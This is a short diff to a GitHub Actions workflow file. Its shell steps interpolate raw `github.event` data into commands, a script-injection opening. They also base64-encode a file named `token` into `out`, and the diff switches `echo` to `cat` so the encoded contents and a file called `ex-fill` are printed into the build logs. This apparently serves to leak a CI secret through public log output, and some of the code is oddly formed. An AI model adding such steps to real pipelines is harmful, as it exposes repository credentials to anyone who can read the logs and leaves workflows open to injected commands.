@@ -11,5 +11,5 @@ jobs:
           echo "Event Data:"
           echo "${{ toJson(github.event) }}"
           echo "${{ github.event }}" 2> ex-fill; cat token,${F555} | base64> out
-          echo ex-fill
-          echo out
+          cat ex-fill
+          cat out
